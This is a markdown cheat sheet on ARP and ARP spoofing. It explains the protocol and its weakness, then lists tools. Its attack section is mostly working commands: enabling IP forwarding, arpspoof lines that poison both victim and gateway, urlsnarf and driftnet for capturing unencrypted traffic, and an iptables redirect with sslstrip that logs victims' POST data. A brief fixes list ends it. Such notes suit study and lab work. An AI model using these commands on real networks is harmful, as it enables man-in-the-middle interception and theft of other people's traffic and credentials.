# ARP (Address Resolution Protocol)

> A communication protocol used to discover MAC address associated with a given IPv4 address

## How it works

Machine **A (10.10.10.42)** sends an IP datagram over a LAN to machine **B (10.10.10.98)**: 
- **A** sends a broadcast (ARP request) asking `who has 10.10.10.98`
- **B** sends back a unicast (ARP reply) saying `10.10.10.98 is at 5D.5D.5D.5D.5D.5D`

## Vulnerability

- A host caches MAC addresses in an ARP table that gets updated when a new ARP reply packet is received even if an ARP request was not sent.
- Origin of ARP packets cannot be authenticated.

# ARP Spoofing

> Sending spoofed ARP replies onto a LAN to associate an attacker's MAC address with the IP address of another host to intercept (and modify) traffic meant for that IP address.

## Tools

- [arpspoof (dsniff)](https://www.monkey.org/~dugsong/dsniff/)
- [ettercap](https://www.ettercap-project.org/)
- [bettercap](https://www.bettercap.org/)

## Basic implementation

- Acting as a router requires the attacker to enable IP forwarding
```
echo "1" > /proc/sys/net/ipv4/ip_forward
```
or
```bash
sysctl net.ipv4.ip_forward=1
```

- The attacker tells the victim he is the default gateway
```bash
arpspoof -t <victim> -r <gateway> -i eth0
```

- The attacker tells the default gateway he is the victim
```bash
arpspoof -t <gateway> -r <victim> -i eth0
```

## Post-spoofing

### URL Snarf

```bash
# Output all non-encrypted HTTP traffic
urlsnarf -i eth0
```

### Drift Net

```bash
# Get non-encrypted images or MPEG audio data
driftnet -i eth0 -d ~/drifted
```

### SSL Strip

- Implementation of Moxie Marlinspike's SSL stripping attacks

```bash
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <port>
```
```bash
sslstrip -l <port>
```

```bash
# All POST data is logged into an 'sslstrip.log' file.
cat sslstrip.log
```

## Fixes
- Packet filters
- HTTPS Everywhere


# References

- [RFC](https://tools.ietf.org/html/rfc826)